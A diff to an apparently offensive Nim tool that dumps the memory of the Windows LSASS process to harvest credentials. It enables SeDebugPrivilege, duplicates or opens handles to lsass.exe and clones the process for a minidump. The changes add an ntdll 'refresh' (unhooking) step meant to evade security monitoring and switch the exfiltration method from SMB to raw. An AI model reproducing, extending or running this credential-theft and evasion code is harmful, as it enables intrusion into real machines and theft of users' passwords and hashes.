@@ -21,15 +21,13 @@ const
     saveToFile: bool = false
 
     mdMethod: minidumpMethod = useCustom
-    exfil: exfilMethod = useSMB
+    exfil: exfilMethod = useRaw
 # Operator Toggles #
 
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?`~"
 
 var 
     pid: ULONG
-
-    hPPL: HANDLE = 0
 
     bytesReturned: DWORD
 
@@ -127,6 +125,7 @@ proc enumLsassHandles(): seq[(ULONG, HANDLE)] =
             
             while status == STATUS_INFO_LENGTH_MISMATCH: 
                 VirtualFree(oinfoBuffer, 0, MEM_RELEASE)
+
                 oinfoBuffer = VirtualAlloc(NULL, ortrnLength, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
                 status = NtQueryObject(dupHandle, cast[OBJECT_INFORMATION_CLASS](2), oinfoBuffer, ortrnLength, addr ortrnLength)
 
@@ -264,8 +263,14 @@ when isMainModule:
     else:
         echo "[-] Failed to Enable SeDebugPrivilege\n[!] Quitting..."
         quit(1)
-        #discard readLine(stdin)
-    
+
+    echo "[!] Attempting to Refresh Target DLL..."
+    var unhookResult = ntdllunhook()
+    if ntdllunhook():
+        echo "[+] Successfully Refreshed Target DLL!\n"
+    else:
+        echo "[-] Could Not Refresh Target DLL!\n"
+
     var 
         dupHandlesSeq = enumLsassHandles()
         victimHandle: HANDLE = cast[HANDLE](NULL)
@@ -279,11 +284,14 @@ when isMainModule:
         echo "[-] No Suitable Handles Could Be Duplicated.\n\n[!] Attempting Risky Operation: Opening Handle Directly to Lsass Process...\n"
 
         while NtGetNextProcess(victimHandle, MAXIMUM_ALLOWED, 0, 0, addr victimHandle) == 0:
+            echo "Handle: ", victimHandle
 
             if GetProcessImageFileNameA(victimHandle, procName, MAX_PATH) == 0:
+                echo procName
                 echo "[-] Failed to Retrieve Process Name! Error: ", GetLastError(), "\n[!] Quitting..."
                 quit(1)
 
+            echo procName
             if lstrcmpiA("lsass.exe", PathFindFileNameA(procName)) == 0:
                 pid = GetProcessId(victimHandle)
                 echo fmt"[+] Found PID {pid} and Obtained Handle {victimHandle} (0x{toHex(victimHandle)})" 
@@ -303,9 +311,6 @@ when isMainModule:
             break
         else:
             echo "[-] Error Cloning Process! Error Code: 0x", toHex($status)
-            #discard readLine(stdin)
-            #echo "[!] Quitting!"
-            #quit(1)
     
     if NT_SUCCESS(status) == false:
         echo "[-] Failed to Clone Process.\n[!] Quitting..."
@@ -404,5 +409,6 @@ when isMainModule:
 
     echo "\n[!] Cleaning Up..."
     for handleTuple in dupHandlesSeq: CloseHandle(handleTuple[1])
+    
     CloseHandle(outFile)
     echo "[!] Done!"
